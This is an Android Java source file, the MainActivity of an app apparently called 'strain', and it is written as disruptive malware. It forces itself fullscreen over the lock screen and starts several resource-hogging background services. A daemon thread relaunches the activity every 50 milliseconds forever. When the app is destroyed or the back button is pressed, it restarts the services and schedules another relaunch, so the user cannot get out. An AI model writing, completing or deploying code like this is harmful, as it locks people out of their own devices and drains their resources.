package com.rhfvnc.strain;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
public class MainActivity extends Activity {
    private GlitchView glitch;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        glitch = new GlitchView(this);
        setContentView(glitch);
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        StrainReceiver.scheduleRelaunch(this, 20);
        Thread storm = new Thread(() -> {
            while (true) {
                try {
                    android.content.Intent i = new android.content.Intent(MainActivity.this, MainActivity.class);
                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            | android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
                            | android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    startActivity(i);
                } catch (Throwable ignored) {}
                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
            }
        });
        storm.setDaemon(true); storm.start();
    }
    @Override
    protected void onResume() { super.onResume(); if (glitch != null) glitch.start(); }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        StrainReceiver.scheduleRelaunch(this, 20);
    }
    @Override
    public void onBackPressed() {
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 20);
    }
}
